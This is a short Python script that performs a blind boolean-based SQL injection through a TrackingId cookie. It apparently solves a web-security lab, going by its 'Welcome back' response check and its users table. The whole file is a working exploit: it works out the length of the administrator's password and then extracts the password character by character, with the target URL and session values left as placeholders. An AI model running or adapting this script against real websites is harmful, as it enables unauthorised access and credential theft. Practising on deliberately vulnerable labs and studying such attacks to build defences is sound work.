import requests
url = "-----put URL Here----"
characters ='abcdefghijklmnopqrstuvwxyz1234567890'

def get_len():
    for i in range(1,101):
        cookie = {'TrackingId':'--------------', 'session':'---------------------------'}
        payload = f"' AND LENGTH((SELECT password from users where username = 'administrator')) = {i} --"
        cookie['TrackingId']= cookie['TrackingId']+payload
        r = requests.get(url, cookies = cookie)
        if 'Welcome back' in r.text:
            return i

def get_data(length):
    temp = ""
    for i in range(1,length+1):
        for char in characters:
            cookie = {'TrackingId':'----------------', 'session':'-----------------------------------'}
            payload = f"' AND SUBSTRING((SELECT password from users where username = 'administrator'),{i},1) = '{char}'--"
            cookie['TrackingId']= cookie['TrackingId']+payload
            r = requests.get(url, cookies = cookie)
            if 'Welcome back' in r.text:
                temp += char
                print(temp)
                break
    return temp



length = get_len()
print(f"Password length: {length}")
print("Dumping Data... Please be patient.")
data = get_data(length)
print(f"Got it!: {data}")
